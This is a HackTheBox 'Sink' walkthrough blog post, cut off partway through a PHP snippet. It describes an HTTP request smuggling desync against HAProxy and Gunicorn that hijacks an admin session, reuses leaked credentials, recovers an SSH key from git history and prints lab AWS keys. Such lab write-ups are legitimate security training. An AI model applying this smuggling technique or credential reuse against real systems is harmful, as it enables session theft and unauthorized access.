<!DOCTYPE html>







<html lang="en" 
  
    mode="dark"
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

    <!-- i18n for `_javascript/utils/timeago.js` -->
    <meta name="day-prompt" content="days ago">
    <meta name="hour-prompt" content="hours ago">
    <meta name="minute-prompt" content="minutes ago">
    <meta name="justnow-prompt" content="just now">

    

    

  

  <!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v4.2.0" />
<meta property="og:title" content="Sink HTB" />
<meta name="author" content="tinyb0y" />
<meta property="og:locale" content="en" />
<meta name="description" content="HTTP Smuggling attack on haproxy, gunicorn server combination. Get admin session key using smuggling attack and leak his notes containing usernames and passwords. Login with a user on Gitea and one of the repo was leaking private key for a user and AWS credentials. Login with private key and configure aws and dump secret keys. Get a password from the dumped secret key and decrypt a message using AWS KMS (Key Management Service) and find the base64 encoded hash which contains the root password." />
<meta property="og:description" content="HTTP Smuggling attack on haproxy, gunicorn server combination. Get admin session key using smuggling attack and leak his notes containing usernames and passwords. Login with a user on Gitea and one of the repo was leaking private key for a user and AWS credentials. Login with private key and configure aws and dump secret keys. Get a password from the dumped secret key and decrypt a message using AWS KMS (Key Management Service) and find the base64 encoded hash which contains the root password." />
<link rel="canonical" href="/posts/Sink/" />
<meta property="og:url" content="/posts/Sink/" />
<meta property="og:site_name" content="tinyb0y" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-08-11T05:30:00+05:30" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Sink HTB" />
<meta name="twitter:site" content="@t1nyb0y" />
<meta name="twitter:creator" content="@tinyb0y" />
<meta name="google-site-verification" content="google_meta_tag_verification" />
<script type="application/ld+json">
{"description":"HTTP Smuggling attack on haproxy, gunicorn server combination. Get admin session key using smuggling attack and leak his notes containing usernames and passwords. Login with a user on Gitea and one of the repo was leaking private key for a user and AWS credentials. Login with private key and configure aws and dump secret keys. Get a password from the dumped secret key and decrypt a message using AWS KMS (Key Management Service) and find the base64 encoded hash which contains the root password.","headline":"Sink HTB","dateModified":"2021-08-11T05:30:00+05:30","@type":"BlogPosting","datePublished":"2021-08-11T05:30:00+05:30","mainEntityOfPage":{"@type":"WebPage","@id":"/posts/Sink/"},"url":"/posts/Sink/","author":{"@type":"Person","name":"tinyb0y"},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


  <title>Sink HTB | tinyb0y
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="tinyb0y">
<meta name="application-name" content="tinyb0y">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
  <link rel="dns-prefetch" href="https://fonts.gstatic.com">

  <!-- GA -->
  

  <!-- jsDelivr CDN -->
  <link rel="preconnect" href="https://cdn.jsdelivr.net">
  <link rel="dns-prefetch" href="https://cdn.jsdelivr.net">

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css">

  <!--
  CSS selector for site.
-->

<link rel="stylesheet" href="/assets/css/style.css">


  <link rel="stylesheet"
    href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">



  <!-- Manific Popup -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">



  <!-- JavaScript -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

</head>


  <body data-spy="scroll" data-target="#toc">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end" lang="en">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" alt="avatar" class="mx-auto">
        
        <img src="/assets/img/hacker-profile.png" alt="avatar" onerror="this.style.display='none'">
      </a>
    </div>

    <div class="site-title mt-3">
      <a href="/">tinyb0y</a>
    </div>
    <div class="site-subtitle font-italic">Pentester. Hacker. Bug Bounty Hunter.</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center">

    
      

      
      <a href="https://github.com/tinyb0y" aria-label="github"
        
        target="_blank" rel="noopener">
        <i class="fab fa-github-alt"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/t1nyb0y" aria-label="twitter"
        
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['tinyb0y','protonmail.com'].join('@')" aria-label="email"
        
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper" class="row justify-content-center topbar-down">
  <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
    <span id="breadcrumb">

    

    

      

        
          <span>
            <a href="/">
              Home
            </a>
          </span>

        

      

        

      

        

          
            <span>Sink HTB</span>
          

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
      <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i>
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper">
      <div id="main">

        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Add attribute 'hide-bullet' to the checkbox list -->




<!-- images -->



  <!-- add CDN prefix if it exists -->

  

  

  <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

  

  <!-- add image placehoder to prevent layout reflow -->

  

  

  
    
      
      
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  

  



<!-- Add lang-badge for code snippets -->




<!-- return -->





<div class="row">

  <div id="post-wrapper" class="col-12 col-lg-11 col-xl-8">

    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

      <h1 data-toc-skip>Sink HTB</h1>

      <div class="post-meta text-muted d-flex flex-column">
        <!-- Published date and author -->
        <div>
          <span class="semi-bold">
            tinyb0y
          </span>
          
          <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->






  on

<span class="timeago "
  
    data-toggle="tooltip"
    data-placement="bottom"
    title="Wed, Aug 11, 2021,  5:30 AM +0530"
  >Aug 11<i class="unloaded">2021-08-11T05:30:00+05:30</i>
</span>

        </div>

        <div>
          <!-- lastmod -->
          

          <!-- read time -->
          <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->



<!-- words per minute  -->










<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="2017 words">11 min read</span>


          <!-- page views -->
          

        </div>

      </div> <!-- .post-meta -->

      <div class="post-content">

        

        <ul>
  <li>Nmap</li>
  <li>Recon
    <ul>
      <li>HTTP Smuggling Attack</li>
      <li>Enumerate the Git Repositories</li>
      <li>Dump AWS (Amazon Web Services) Secrets, Keys</li>
      <li>Decryption using AWS KMS</li>
    </ul>
  </li>
</ul>

<p><strong>Short Brief</strong></p>

<p>HTTP Smuggling attack on haproxy, gunicorn server combination. Get admin session key using smuggling attack and leak his notes containing usernames and passwords. Login with a user on Gitea and one of the repo was leaking private key for a user and AWS credentials. Login with private key and configure aws and dump secret keys. Get a password from the dumped secret key and decrypt a message using AWS KMS (Key Management Service) and find the base64 encoded hash which contains the root password.</p>

<h1 id="nmap">Nmap</h1>
<p>As usual let’s start with nmap port scan</p>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>Nmap scan report <span class="k">for </span>10.129.186.159
Host is up <span class="o">(</span>0.18s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 60311 closed ports, 5221 filtered ports
Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp
5000/tcp open  upnp
</pre></td></tr></tbody></table></code></div></div>

<p>Port 22, 3000, 5000 are open.  Less ports then we have to enumerate more.</p>

<h1 id="recon">Recon</h1>
<p>Let’s enumerate</p>

<p><strong>Port 3000</strong></p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811043220.png" alt="[Pasted image 20210811043220.png]" /></p>

<p><strong>Port 5000</strong></p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811043255.png" alt="[Pasted image 20210811043255.png]" /></p>

<p>We have some kind of DevOps blog. And we have a sign up page. Let’s signup and see what we have.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811043817.png" alt="[Pasted image 20210811043817.png]" /></p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811043852.png" alt="[Pasted image 20210811043852.png]" /></p>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="nb">cat</span> /etc/hosts

10.129.186.244 sink.htb
</pre></td></tr></tbody></table></code></div></div>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811050433.png" alt="[Pasted image 20210811050433.png]" /></p>

<p>We can add some notes here. Apart from this we dont have much interesting things on the webpage.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811050853.png" alt="[Pasted image 20210811050853.png]" /></p>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>Server: gunicorn/20.0.0
Date: Wed, 11 Aug 2021 04:11:45 GMT
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
Content-Length: 217
Location: http://10.129.186.244:5000/home
Vary: Cookie
Via: haproxy
X-Served-By: 874e4a1392a2
</pre></td></tr></tbody></table></code></div></div>

<p>The response headers from the server caught my attention. There is a gunicorn server in the backend and haproxy is acting like a load balancer.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811051428.png" alt="[Pasted image 20210811051428.png]" /></p>

<p>After doing some research, haproxy gunicorn combination is vulnerable to HTTP Smuggling attack if it is not properly configured. So now we need to find out what kind of smuggling attack we can do.</p>

<blockquote>
  <p>I Highly Recommend to Read these articles
https://portswigger.net/web-security/request-smuggling</p>
</blockquote>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811052044.png" alt="[Pasted image 20210811052044.png]" /></p>

<p>When the front-end server forwards HTTP requests to a back-end server, it typically sends several requests over the same back-end network connection, because this is much more efficient and performant. The protocol is very simple: HTTP requests are sent one after another, and the receiving server parses the HTTP request headers to determine where one request ends and the next one begins:</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811051916.png" alt="[Pasted image 20210811051916.png]" /></p>

<p>In this situation, it is crucial that the front-end and back-end systems agree about the boundaries between requests. Otherwise, an attacker might be able to send an ambiguous request that gets interpreted differently by the front-end and back-end systems:</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811051954.png" alt="[Pasted image 20210811051954.png]" /></p>

<p>Haproxy is using Transfer-Encoding and Gunicorn server is using Content-Length as primary.</p>

<p>So let’s submit a comment on the main page we have seen and intercept in BurpSuite</p>

<h2 id="http-smuggling-desync-attack">HTTP Smuggling DeSync Attack</h2>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811052340.png" alt="[Pasted image 20210811052340.png]" /></p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811052404.png" alt="[Pasted image 20210811052404.png]" /></p>

<p>Send the request to Repeater in burpsuite and modifying the payload.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811052559.png" alt="[Pasted image 20210811052559.png]" /></p>

<p>We craft the payload and write two requests in one request. As the HAProxy will see it as one request because Transfer-Encoding but we put a special character <code class="language-plaintext highlighter-rouge">[\x0b]</code> byte in front of chunked which is ignored by HAProxy but it is interpreted by gunicorn server and breaks into two requests at the backend. Second request we mention the <code class="language-plaintext highlighter-rouge">Content-Length</code> size as little more than usual request length so that we can grab the next incoming request and attaching it to out comment field <code class="language-plaintext highlighter-rouge">msg</code>.</p>

<p>Let;s send this request and see if we can grab other users request.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811053502.png" alt="[Pasted image 20210811053502.png]" /></p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811053532.png" alt="[Pasted image 20210811053532.png]" /></p>

<p>And yes, we could the grab the next incoming request containing a session key which is different from our session-key.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811053844.png" alt="[Pasted image 20210811053844.png]" /></p>

<p>After changing the session key refresh the page.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811053925.png" alt="[Pasted image 20210811053925.png]" /></p>

<p>We are admin user on the website.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811054046.png" alt="[Pasted image 20210811054046.png]" /></p>

<p>There are some notes stored in the admin notes section. We can view the notes.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811054307.png" alt="[Pasted image 20210811054307.png]" /></p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811054320.png" alt="[Pasted image 20210811054320.png]" /></p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811054334.png" alt="[Pasted image 20210811054334.png]" /></p>

<p>Notes contain usernames, password and subdomains.</p>

<p>Let’s add the new subdomain and enumerate the pages.</p>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="nb">cat</span> /etc/hosts

10.129.186.244 sink.htb nagios.sink.htb chef.sink.htb code.sink.htb
</pre></td></tr></tbody></table></code></div></div>

<p>All the subdomains are pointing to the same sites on 3000 and 5000 ports.</p>

<p>Let’s enumerate Port 3000 now. We know that we have GitTea implemented.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811055016.png" alt="[Pasted image 20210811055016.png]" /></p>

<p>We have few more users from the GitTea users section. Let’s add them to our list. One user <code class="language-plaintext highlighter-rouge">root</code> is common in both the sights. I tried to login with root user on Gitea.</p>

<p><code class="language-plaintext highlighter-rouge">user: root</code>
<code class="language-plaintext highlighter-rouge">pass: FaH@3L&gt;Z3})zzfQ3</code></p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811055309.png" alt="[Pasted image 20210811055309.png]" /></p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811055325.png" alt="[Pasted image 20210811055325.png]" /></p>

<p>Yep, we could login as root user on Gitea and there are some private repositories for the user. We can view them.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811055503.png" alt="[Pasted image 20210811055503.png]" /></p>

<p>We have 9 commits on <code class="language-plaintext highlighter-rouge">Key_Management</code> repository.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811055852.png" alt="[Pasted image 20210811055852.png]" /></p>

<p>After going through each commit and the differences in each commit.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811055932.png" alt="[Pasted image 20210811055932.png]" /></p>

<p>Marcus committed a SSH private key bymistake and deleted in the next commit. But Git stores all the commits. Developers should be careful while commit the changes to version control management.</p>

<p>Deletion from commit is shown in red</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811060142.png" alt="[Pasted image 20210811060142.png]" /></p>

<p>I have copied SSH key locally and tried to login with marcus user.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811060356.png" alt="[Pasted image 20210811060356.png]" /></p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811060622.png" alt="[Pasted image 20210811060622.png]" /></p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811060653.png" alt="[Pasted image 20210811060653.png]" /></p>

<p>We are marcus on the box and we have a user flag. Now we need to find a way to escalate to root.</p>

<h1 id="user-escalation">User Escalation</h1>

<p>Revisiting the Gitea for aws (Amazon Web Services) keys.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210811061429.png" alt="[Pasted image 20210811061429.png]" /></p>

<div lang="php" class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre></td><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="k">require</span> <span class="s1">'vendor/autoload.php'</span><span class="p">;</span>

<span class="kn">use</span> <span class="nc">Aws\CloudWatchLogs\CloudWatchLogsClient</span><span class="p">;</span>
<span class="kn">use</span> <span class="nc">Aws\Exception\AwsException</span><span class="p">;</span>

<span class="nv">$client</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">CloudWatchLogsClient</span><span class="p">([</span>
	<span class="s1">'region'</span> <span class="o">=&gt;</span> <span class="s1">'eu'</span><span class="p">,</span>
	<span class="s1">'endpoint'</span> <span class="o">=&gt;</span> <span class="s1">'http://127.0.0.1:4566'</span><span class="p">,</span>
	<span class="s1">'credentials'</span> <span class="o">=&gt;</span> <span class="p">[</span>
		<span class="s1">'key'</span> <span class="o">=&gt;</span> <span class="s1">'AKIAIUEN3QWCPSTEITJQ'</span><span class="p">,</span>
		<span class="s1">'secret'</span> <span class="o">=&gt;</span> <span class="s1">'paVI8VgTWkPI3jDNkdzUMvK4CcdXO2T7sePX0ddF'</span>
	<span class="p">],</span>
	<span class="s1">'version'</span> <span class="o">=&gt;</span> <span class="s1">'latest'</span>
<span class="p">]);</span>
<span class="k">try</span> <span class="p">{</span>
<span class="nv">$client</span><span class="o">-&gt;</span><span class="nf">createLogGroup</span><span class="p">(</span><span class="k">array</span><span class="p">(</span>
	<span class="s1">'logGroupName'</span> <span class="o">=&gt;</span> <span class="s1">'Chef_Events'</span><span class="p">,</span>
<span class="p">));</span>
<span class="p">}</span>
<span class="k">catch</span> <span class="p">(</span><span class="nc">AwsException</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">echo</span> <span class="nv">$e</span><span class="o">-&gt;</span><span class="nf">getMessage</span><span class="p">();</span>
    <span class="k">echo</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">try</span> <span class="p">{</span>
<span class="nv">$client</span><span class="o">-&gt;</span><span class="nf">createLogStream</span><span class="p">([</span>
	<span class="s1">'logGroupName'</span> <span class="o">=&gt;</span> <span class="s1">'Chef_Events'</span><span class="p">,</span>
	<span class="s1">'logStreamName'</span> <span class="o">=&gt;</span> <span class="s1">'20201120'</span>
<span class="p">]);</span>
